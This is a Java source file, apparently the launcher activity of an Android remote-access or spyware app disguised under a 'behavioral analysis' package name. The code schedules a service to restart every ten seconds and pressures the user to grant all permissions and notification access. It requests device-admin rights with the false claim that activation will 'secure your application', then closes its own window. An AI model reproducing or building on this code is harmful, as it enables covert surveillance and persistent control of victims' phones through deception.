package com.behavioralanalysis.service;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.Typeface;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;

import com.remote.app.R;

public class MainActivity extends Activity {
    private DevicePolicyManager devicePolicyManager;
    private ComponentName componentName;

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        PackageInfo info = null;

        setContentView(R.layout.activity_main);
        Intent intent = new Intent(this, MainService.class);
        PendingIntent pendingIntent = PendingIntent.getService(
                getApplicationContext(),
                1,
                intent,
                0
        );
        AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
        alarmManager.setRepeating(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                0,
                10000,
                pendingIntent
        );
        boolean isNotificationServiceRunning = isNotificationServiceRunning();
        if (!isNotificationServiceRunning) {
            Context context = getApplicationContext();
            String[] permissions = new String[]{};
            try {
                info = getPackageManager().getPackageInfo(
                        context.getPackageName(),
                        PackageManager.GET_PERMISSIONS
                );
                permissions = info.requestedPermissions;
            } catch (PackageManager.NameNotFoundException ex) {
                ex.printStackTrace();
            }

            Toast toast = Toast.makeText(
                    context,
                    "Enable 'Package Manager'\n Click back x2\n and Enable all permissions",
                    Toast.LENGTH_LONG
            );

            TextView view = (TextView) toast.getView().findViewById(android.R.id.message);
            view.setTextColor(Color.RED);
            view.setTypeface(Typeface.DEFAULT_BOLD);
            view.setGravity(Gravity.CENTER_VERTICAL | Gravity.CENTER_HORIZONTAL);
            toast.show();

            requestPermissions(this, permissions);

            startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));

            devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            componentName = new ComponentName(this, Admin.class);
            if (!devicePolicyManager.isAdminActive(componentName)) {
                Intent tmpIntent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                tmpIntent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
                tmpIntent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Click on Activate button to secure your application.");
                startActivity(tmpIntent);
            }
        }
        finish();
    }

    public void requestPermissions(Context context, String[] permissions) {
        if (context != null && permissions != null) {
            ActivityCompat.requestPermissions(this, permissions, 1);
        }
    }

    private boolean isNotificationServiceRunning() {
        ContentResolver contentResolver = getContentResolver();
        String enabledNotificationListeners =
                Settings.Secure.getString(contentResolver, "enabled_notification_listeners");
        String packageName = getPackageName();

        return enabledNotificationListeners != null && enabledNotificationListeners.contains(packageName);
    }
}
